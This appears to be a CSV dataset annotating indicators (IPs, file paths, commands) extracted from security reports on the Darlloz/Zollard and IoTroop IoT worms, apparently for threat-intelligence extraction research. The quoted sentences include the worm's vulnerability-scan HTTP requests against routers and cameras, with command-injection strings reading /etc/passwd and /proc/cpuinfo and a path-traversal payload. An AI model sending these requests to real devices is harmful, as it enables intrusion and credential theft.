report,word,verb,objectType,prettyReg,match,label,asgSyscall,sentence
Darlloz-Giac.csv,“uname,,INFO,uname(.|$),0,0,,"Figure 7 shows the URL encoded string used to exploit CVE_2012_1823 as well as the HTTP headers used by Zollard including the User_agent string “Mozilla/5.0+(compatible;+Zollard;+Linux)”    Figure'7:''HTTP'POST'method'with'the'CVEE2012E1823'(Imperva,'2014)'and'HTTP'Headers'matching'the'exploit'attempt'in'Figure'2' Figure 8 also reveals something of interest: the “uname –m” command is used to determine if the system is 32 or 64 bit."
Darlloz-Giac.csv,67.174.125.223),,NET,ip_addr,0,0,,"CVE-2014-6271: Known as “Shellshock” or “BASH Bug” Sample (sample from 67.174.125.223)   In 2014, a critical vulnerability was discovered in the GNU Project’s Bourne_Again Shell (BASH) and assigned CVE_2014_6271 (NIST, 2014)."
Darlloz-Giac.csv,8.8.4.4,gather,NET,ip_addr,0,0,,"[0%9]\{1,3\}'+|+sort+|+uniq+–u+8.8.8.8 8.8.4.4 8.8.8.8 127.0.0.1 61.132.X.X 202.102.X.X 202.102.X.X 202.102.X.X (Truncated)   Although the strings information may be altered, the information gathered indicates this file may be used to conduct some type of DOS (Denial of Service) or other network_based attacks."
Darlloz-Icc17.csv,/var/run/,,FILE,/run/.*,0,0,,Zollard link  /var/run/  folder  classification efficiency.
Darlloz-Icc17.csv,iptables,,PROC,^iptables$,0,0,,( iptables -D INPUT -p tcp --dport 23 -j DROP.
Darlloz-Icc17.csv,iptables,use,PROC,^iptables$,0,0,,Then will use iptables [21] to drop packets which destination port 23 and port 32764.
Darlloz-Icc17.csv,/var/run/,,FILE,/var/run/.*,0,0,,Zollard link  /var/run/  folder  classification efficiency.
Darlloz-ResearchCheckPoint.csv,(222.112.82.231),,NET,ip_addr,0,0,,We were able to identify two active reporting servers at the time of our research:  hl852.com (222.112.82.231) ha859.com (222.112.82.231)
Darlloz-ResearchCheckPoint.csv,/shell?echo+jaws+123456;cat+/proc/cpuinfo,get,FILE,/proc,0,0,,"These tests locate vulnerabilities in any of the following devices and/or infrastructure:   The specific vulnerability scan traffic is the following:  GET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)  Connection: keep-alive  Avtech GET /shell?echo+jaws+123456;cat+/proc/cpuinfo HTTP/1.1 Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)  Connection: keep-alive  JAWS Web Server “GET /upgrade_handle.php?cmd=writeuploaddir&uploaddir=%%27;ech Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)  Connection: keep-alive  NetGear GET /board.cgi?cmd=cat%%20/etc/passwd HTTP/1.1 Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)  Connection: keep-alive  VACRON GET /system.ini?loginuse&loginpas HTTP/1.1 Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)  Connection: keep-alive  WIFICAM POST /command.php HTTP/1.1 Host: %d.%d.%d.%d  Connection: keep-alive  Content-Type: application/x-www-form-urlencoded  Content-Length: %d     cmd=cat%%20/var/passwd     DLINK DIR-600 GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&curpath=/&cu rrentsetting.htm=1&cmd=echo+dgn+123456 HTTP/1.1  Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)  Connection: keep-alive     NetGear DGN1000 POST /apply.cgi HTTP/1.1 Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)  Connection: keep-alive     submit_button=Diagnostics&change_action=gozila_cgi&submit_typ  e=start_ping&action=&commit=0&nowait=1&ping_ip=%%3b%%20AAA  BBB|||%%20%%3b&ping_size=&ping_times=5&traceroute_ip=     Linksys POST /hedwig.cgi HTTP/1.1 Host: %d.%d.%d.%d (Host: %d.%d.%d.%d:%d)  Connection: keep-alive  Content-type: text/xml  Cookie: uid=qDxppsreSd  Content-Length: %d     <?xml version=’1.0′ encoding=’UTF-8′?><postxml><module><servi  ce>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>  </module></postxml>  DLINK DIR-8 This is a sample of a PCAP taken from one of the vulnerability scans:    C&C Communication IoTroop’s C&C backend is composed of several components, each responsible for a unique purpose."
Darlloz-Trendmicro.csv,/var/run/.lightscan,delete,FILE,/var/run/.*,0,0,, This worm deletes the following files:  /var/run/.lightscan /var/run/lightscan /var/run/mipsel /var/run/mips /var/run/sh /var/run/arm /var/run/ppc /var/run/m /var/run/mi /var/run/s /var/run/a /var/run/p /var/run/msx /var/run/mx /var/run/sx /var/run/ax /var/run/px /var/run/32 /var/run/sel /var/run/pid /var/run/gcc /var/run/dev /var/run/psx /var/run/mpl /var/run/mps /var/run/sph /var/run/arml /var/run/mips.l /var/run/mipsell /var/run/ppcl /var/run/shl /bin/pp /bin/mi /bin/mii /var/tmp/dreams.install.sh /var/tmp/ep2.ppc /usr/bin/wget /usr/bin/-wget Propagation 
